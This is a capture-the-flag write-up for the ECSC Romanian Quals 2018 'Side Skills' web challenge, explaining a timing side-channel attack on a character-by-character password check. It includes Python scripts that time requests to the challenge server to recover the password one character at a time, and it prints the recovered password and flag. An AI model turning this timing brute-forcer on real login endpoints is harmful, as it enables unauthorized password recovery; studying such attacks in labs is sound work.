---
title: Side Skills
contest: ECSC Romanian Quals 2018
authors: trupples
layout: writeup
---

This has to be one of my favourite challenge types. The name suggests that it's
a side channel attack so I looked at perhaps the only measurable side effect
of a web challenge - the server response time. The idea is that if the server
checks the password (the p parameter) character by character and immediately
stops when it finds a mismatch we can detect how many correct characters are
at the beginning of the provided password.

For example, if the correct password is `MyPassword` and we send it `Montenegro`
it will first check if the first character is good, and it is, then it will
check the second and stop as there's a mismatch. On the other hand, if we sent
`MyPaddle` it will have to do 5 checks before finding out that the password
is incorrect. If the checks are slow enough (and they artificially are in this
challenge) this matching prefix length is measurable.

To begin we can try each possible length-1 password and time the server's
response:

```py
import requests
import string
import time

possible_chars = string.ascii_lowercase + string.digits + string.ascii_uppercase

for c in possible_chars:
	time_before = time.clock()
	requests.get("https://side-skills.ctf.cybersecuritychallenge.ro/?p="+c)
	time_after = time.clock()
	response_time = time_after - time_before
	print c, response_time
```

I think the results also depend on your ping to the server but I got around
0.13-0.15 for all characters EXCEPT for lowercase `p` which had a considerably
different response time of 0.25. This is a good enough indication that the
first character of the password is `p`.

Now we can do the same thing but instead of trying length-1 passwords we'll try
length-2 passwords that start with `p`:

```py
import requests
import string
import time

possible_chars = string.ascii_lowercase + string.digits + string.ascii_uppercase

for c in possible_chars:
	time_before = time.clock()
	requests.get("https://side-skills.ctf.cybersecuritychallenge.ro/?p=p"+c)
	time_after = time.clock()
	response_time = time_after - time_before
	print "p"+c, response_time
```

This time all server response times hovered around 0.22-0.25 except for the one
for `a` which was 0.30. This means that the password starts with `pa`. 

We now have to go on and on with algorithm of finding out each of the
password's characters one by one. The following script automates this process:

```py
import requests
import time
import string
import sys

known_prefix = ""

def response_time(c):
	time_before = time.clock()
	requests.get("https://side-skills.ctf.cybersecuritychallenge.ro/?p="+known_prefix+c)
	time_after = time.clock()
	print known_prefix+c, time_after-time_before
	sys.stdout.flush()	# Mingw doesn't flush on print
	return time_after-time_before

def next_char():
	# Go through each character and record its response time
	times = [(c, response_time(c)) for c in string.ascii_lowercase + string.digits + string.ascii_uppercase]

	# Sort by response time
	times.sort(key=lambda pair: pair[1])

	# Log sorted response times
	print times

	# Return slowest response time's character
	return times[-1][0]

# Warm it up - without this the first request for '0' (or 'a') has a falsely greater time
response_time("WarmupWarmup")

while True:
	print "->", known_prefix
	known_prefix += next_char()

	# Test to see if we also have the flag in the response
	res = requests.get("https://side-skills.ctf.cybersecuritychallenge.ro/?p="+known_prefix).text
	if "ECSC" in res:
		print res
		sys.exit(0)

```

After a while we get to the final password: `passIsS0str0ng4` and sending it to
the server gets us back a congratulatory message and the flag:

> Congratulations! You are a really good brute forcer. Here is the flag:ECSC{8D6794917D9306ED63269DBF4E636C7366B1F25FFC6782F93553D763295BF773}
